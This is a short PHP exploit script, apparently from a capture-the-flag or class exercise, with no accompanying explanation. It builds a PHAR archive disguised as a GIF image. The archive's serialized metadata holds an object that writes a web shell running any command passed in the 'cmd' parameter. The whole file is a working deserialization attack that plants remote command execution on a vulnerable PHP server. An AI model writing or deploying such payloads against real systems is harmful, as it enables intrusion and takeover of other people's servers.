<?php
class Meme
{
    public $title;
    public $author;
    public $filename;
    private $content = NULL;
    function __construct($title, $author, $content = NULL){}
}
$meme = new Meme("","",'<?php system($_GET["cmd"]);?>');
$meme->filename = "images/M10915027/hack.php";
$phar = new Phar("hack.phar");
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>"); 
$phar->setMetadata($meme);
$phar->addFromString("hack.gif", "");
$phar->stopBuffering();
?>
